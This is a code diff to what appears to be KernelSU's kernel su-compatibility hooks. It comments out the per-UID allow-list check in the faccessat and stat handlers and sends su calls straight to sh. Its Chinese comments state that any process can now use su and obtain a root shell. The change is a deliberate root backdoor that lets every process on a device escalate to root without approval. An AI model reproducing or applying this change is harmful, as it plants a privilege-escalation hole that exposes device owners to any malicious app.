@@ -75,9 +75,10 @@ int ksu_handle_faccessat(int *dfd, const char __user **filename_user, int *mode,
 {
     const char su[] = SU_PATH;
 
-    if (!ksu_is_allow_uid_for_current(current_uid().val)) {
-        return 0;
-    }
+    /* 权限检查已移除，任何进程都可以使用 su */
+    /* if (!ksu_is_allow_uid_for_current(current_uid().val)) { */
+    /*     return 0; */
+    /* } */
 
     char path[sizeof(su) + 1];
     memset(path, 0, sizeof(path));
@@ -96,9 +97,10 @@ int ksu_handle_stat(int *dfd, const char __user **filename_user, int *flags)
     // const char sh[] = SH_PATH;
     const char su[] = SU_PATH;
 
-    if (!ksu_is_allow_uid_for_current(current_uid().val)) {
-        return 0;
-    }
+    /* 权限检查已移除，任何进程都可以使用 su */
+    /* if (!ksu_is_allow_uid_for_current(current_uid().val)) { */
+    /*     return 0; */
+    /* } */
 
     if (unlikely(!filename_user)) {
         return 0;
@@ -147,9 +149,9 @@ long ksu_handle_execve_sucompat(const char __user **filename_user, int orig_nr, 
     if (likely(memcmp(path, su, sizeof(su))))
         goto do_orig_execve;
 
-    pr_info("sys_execve su found\n");
+    pr_info("sys_execve su found, escaping to root shell\n");
     pending_sucompat = ksu_sulog_capture_sucompat(*filename_user, argv_user, GFP_KERNEL);
-    *filename_user = ksud_user_path();
+    *filename_user = sh_user_path();  // 直接执行 sh，获得 root shell
 
     ret = escape_with_root_profile();
     if (ret) {
@@ -160,13 +162,13 @@ long ksu_handle_execve_sucompat(const char __user **filename_user, int orig_nr, 
 
     ret = ksu_syscall_table[orig_nr](regs);
     if (ret < 0) {
-        pr_err("failed to execve ksud as su: %ld, fallback to sh\n", ret);
+        pr_err("failed to execve sh as su: %ld\n", ret);
         ksu_sulog_emit_pending(pending_sucompat, ret, GFP_KERNEL);
-        *filename_user = sh_user_path();
     } else {
         ksu_sulog_emit_pending(pending_sucompat, ret, GFP_KERNEL);
-        return ret;
     }
+
+    return ret;
 
 do_orig_execve:
     return ksu_syscall_table[orig_nr](regs);
